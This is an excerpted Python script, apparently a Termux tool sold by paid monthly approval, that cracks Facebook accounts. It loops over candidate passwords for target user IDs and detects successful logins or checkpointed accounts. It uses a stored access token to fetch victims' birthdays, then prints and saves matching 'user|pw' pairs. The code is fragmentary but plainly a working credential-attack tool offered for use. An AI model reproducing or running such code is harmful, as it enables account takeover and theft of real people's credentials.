...
def logo():
	print("""%s
           ...
           \033[0;37m░╚════╝░╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝
             ...
             \033[1;93m▇▇➣    \033[1;94m month 500 tk FOR APRVAL       \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://mbasic.facebook.com/UPDATE.DARK.CYBER.BD71')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/tasnim74/Approval.txt/tree/main').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def chigozie():
    ...
    try:
        ...
        nama = requests.get('https://mbasic.facebook.com/me?access_token=%s'%(tokn)).json()['name']
    ...
    def __api__(self, user, __chi__):
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                break
            elif "mbasic.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://mbasic.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
    ...
    'viewport-width': '980',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        cp_ttl = session.get(f'https://mbasic.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-JIBON] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
